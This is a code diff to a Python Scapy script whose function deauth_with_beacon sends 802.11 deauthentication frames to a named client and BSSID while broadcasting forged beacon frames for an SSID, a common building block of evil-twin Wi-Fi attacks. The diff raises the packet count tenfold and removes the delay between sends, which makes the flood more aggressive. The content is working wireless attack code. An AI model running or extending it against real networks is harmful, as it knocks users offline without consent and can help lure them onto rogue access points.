@@ -1,5 +1,4 @@
 from scapy.all import sendp, Dot11, RadioTap, Dot11Deauth, Dot11Beacon, Dot11Elt, RandMAC
-import time
 from utils import LOGGER
 
 
@@ -62,12 +61,11 @@ def deauth_with_beacon(iface: str, SSID: str, deauth_BSSID: str, deauth_client: 
         Dot11Elt(ID='SSID', info=SSID, len=len(SSID))
     try:
         LOGGER.info("Sending deauth and beacon packets to client: '" + deauth_client + "' from BSSID: '" + deauth_BSSID + "' through interface: '" + iface + "'.")
-        for i in range(timeout * 10):
+        for i in range(timeout * 100):
             sendp(deauth_packet, iface=iface, count=1)
             print(f'SENDING DEAUTH to {deauth_BSSID}')
             sendp(beacon_packet, iface=iface, count=1)
             print(f'SENDING BEACON for {beacon_BSSID}')
-            time.sleep(0.1)
     except KeyboardInterrupt:
         LOGGER.info("KeyboardInterrupt detected.")
         print("\nStopping...")
